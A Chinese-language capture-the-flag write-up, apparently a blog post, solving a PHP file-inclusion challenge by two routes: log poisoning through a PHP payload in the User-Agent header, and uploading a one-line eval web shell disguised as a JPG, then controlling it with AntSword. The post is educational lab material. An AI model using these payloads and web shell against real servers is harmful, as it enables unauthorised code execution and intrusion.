---
title: 
date: 2026-04-24 13:20:00 +0800
categories: [NSSCTF]
tags: [Web_wp, 日志包含漏洞, 文件上传]
mermaid: true
---


## 前言
---

两种思路
- 日志包含漏洞
- 文件上传


## 方法一：利用日志包含漏洞
---

三个前提：

- 存在LFI漏洞（拥有代码执行能力）
> LFI漏洞：网站后端使用`include`接受用户可控的文件路径，`include`自带PHP解析特性，加载文件时会直接执行里面PHP代码

- 日志可访问（拥有漏洞利用的载体）
    - Nginx
        - `/var/log/nginx/access.log`
        - `/var/log/nginx/error.log`
    - Apache
        - Debian：`/var/log/apache2/access.log`
        - RedHat：`/var/log/httpd/access_log`

- 日志可写（拥有植入恶意代码的入口）


### HOW
---

#### first 

BP抓包后

将`UA`改成``` <?php echo `ls /`;?> ```

![alt text](/assets/img/20260424/2.png)

#### second

访问`/var/log/nginx/acess.log`

得到`ls /`的执行结果

![alt text](/assets/img/20260424/3.png)

#### fourth

直接访问这个`ffffflalalallalalalalalalalg`文件

得到flag

![alt text](/assets/img/20260424/4.png)

### WHY
---

利用BP抓包，修改HTTP请求头里的`User-Agent`字段，填入PHP恶意代码后发送请求

服务端`Nginx/Apache`会自动记录本次请求，将篡改后的UA内容原样写入`access.log`日志文件中

随后利用`LFI`漏洞，依靠PHP`include`的底层特性，自动解析执行日志内容中恶意的PHP代码


## 方法二：文件上传
---

工具：
- `antsword`
- `dirsearch`

### HOW

#### first

通过`dirsearch`扫描，发现`/upload.php`

![alt text](/assets/img/20260425/1.png)

#### second

访问该网页，上传`shell.jpg`

`<?php @eval($_POST['cmd']);?>`

![alt text](/assets/img/20260425/2.png)

#### third

通过蚁剑进行连接

![alt text](/assets/img/20260425/3.png)


![alt text](/assets/img/20260425/4.png)


#### fourth

在根目录下找到flag

![alt text](/assets/img/20260425/5.png)

## Q&A

### Q：为什么在方法二中，要在蚁剑中配置请求信息，而不是将uri放在url后面直接访问？
A：

首先，在没有`.user.ini`的`auto_prepend_file=shell.jpg`的前提下，图片木马无法直接以 PHP 解析

但是，在这道题目中，存在 LFI漏洞，有`include`可以利用

通过方法一截取到的报文分析，网页以`nss`的字段向后端的`include`函数传参

而这正是方法二中，在蚁剑请求信息构造请求的原因

总的来说：

`LFI` + `include` 强制解析 → 图片木马被当作 PHP 执行 → 绕过缺少 `.user.ini` 的限制

## 题目链接
---
[[SWPUCTF 2025 秋季新生赛]ezez_include](https://www.nssctf.cn/problem/7117)